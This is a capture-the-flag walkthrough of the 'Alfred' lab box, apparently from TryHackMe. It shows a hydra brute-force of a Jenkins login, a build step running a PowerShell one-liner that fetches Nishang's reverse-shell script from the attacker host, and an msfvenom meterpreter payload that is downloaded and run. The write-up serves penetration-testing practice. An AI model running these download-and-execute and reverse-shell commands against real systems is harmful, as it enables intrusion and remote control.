# Alfred

## Tools

***[Nishang](https://github.com/samratashok/nishang)*** is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.  

## Initial Access

[Jenkins Documentation](https://www.jenkins.io/doc/book/installing/initial-settings/#networking-parameters) indicates the default port is 8080.  

Shellhacks provide a quick understanding of [Jenkins Default Credentials](https://www.shellhacks.com/jenkins-default-password-username/). Since this instance is already running and the default username ('admin') is already known, it makes sense to attempt a brute force the login.  

`:> hydra -s 8080 -l admin -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt 10.67.140.52 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&pSubmit=Sign+in:Invalid username or password' -f -o /tmp/jenkins_login.txt`  

Hydra identifies the ![weak password](/assets/alfred-01.png).  


## Nishang

Clone nishang into the /tmp folder `:> git clone https://github.com/samratashok/nishang.git`  

![Nishang Clone](assets/alfred-02.png)  

Read through the scripts and identify Invoke-PoweShellTcp.ps1 is used for reverse and bind shells.  

Check the instructions to find the command will be something like: `:> Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444`

Set up a server in the Nishang folder enabling the transfer of this script to the Jenkins enviornment: `:> python3 -m http.server 9000`

Set up a listener to receive the incoming reverse shell: `:> nc -lvnp 8000`

![python server](/assets/alfred-03.png)  

## Exploit Jenkins

Jenkins has an existing project. Click on "Configure" and move to the build tasks and observe the existing `whoami` command. 

![Jenkins Project](/assets/alfred-04.png)  

Add a  build step that will "Execute a Windows Batch Command.  

![Windows Batch Command](/assets/alfred-05.png)  

Add a powershell command to this new step which will download and execute `Invoke-PowerShellTcp.ps1`. 

`:> powershell iex (New-Object Net.WebClient).DownloadString('http://10.67.123.179:9000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.67.123.179 -Port 8000`  

![Build-Steps](/assets/alfred-06.png)

Click "Save" to return to the project and click "Build Now" to initaite the pipeline and Receive the reverse shell.  

![Build-Pipeline](/assets/alfred-07.png)

Open the Build that is currently executing. Find the "Console Output" to observe the steps executed during the build.  

![Console Output](/assets/alfred-08.png)

Since `whoami` tells us where to look, we can search through that user to find the target file.  

![Bruce](/assets/alfred-09.png)

## Privilege Escalation

***Create the Payload***

As in the instruction, create the malicious payload using msfvenom on the attacking device:  

`:> msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.67.123.179 LPORT=4444 -f exe -o robin.exe`  

It can be put in the nishang/Shells folder since that folder is already serving.  

![Robin](/assets/alfred-10.png)

***Prepare to receive the shell***

Start metasploit framework: `:>msfconsole`

`:> use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST=10.67.123.179 set LPORT=4444 run  `

![Handler](/assets/alfred-11.png)

***Transfer the Payload***

If the previous build is still running, close the shell window and stop the build.  

Alter the configuration of the build to transfer the new payload.  

The command looks like: 
`:> powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"`

`:> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.67.123.179:8000/robin.exe','robin.exe')"`

![Reconfigure](/assets/alfred-12.png)

Restart listener to receive the incoming reverse shell: `:> nc -lvnp 8000`

When the build runs, the file is transferred and can be found in the workspace.  

![Post-Build](/assets/alfred-13.png)

![Post-Build 2](/assets/alfred-14.png)

***Run the payload*** 

`:> Start-Process robin.exe`